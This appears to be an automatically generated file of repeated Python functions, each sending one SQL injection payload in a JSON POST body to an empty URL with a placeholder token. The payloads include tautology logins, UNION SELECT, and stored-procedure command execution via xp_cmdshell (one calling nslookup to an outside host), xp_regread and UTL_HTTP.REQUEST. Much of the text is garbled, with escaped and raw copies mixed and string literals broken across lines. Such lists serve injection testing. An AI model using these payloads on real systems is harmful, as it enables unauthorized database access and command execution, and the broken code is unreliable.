'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1 or \\x22\\x22=\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or a=a--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or a=a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22') or ('a'='a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'hi' or 'x'='x';\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22procedure\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22handler\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or username like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or uname like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or userid like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or uid like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or user like '%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'; exec master..xp_cmdshell\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'; exec xp_regread\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22t'exec master..xp_cmdshell 'nslookup www.google.com'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22--sp_password\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' UNION SELECT\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' UNION ALL SELECT\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or (EXISTS)\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' (select top 1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'||UTL_HTTP.REQUEST\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221;SELECT%20*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22<>\x22'%;)(&+\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'%20or%201=1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'sqlattempt1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%28\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%26\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%21\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 3=3\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x18 or 3=3 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
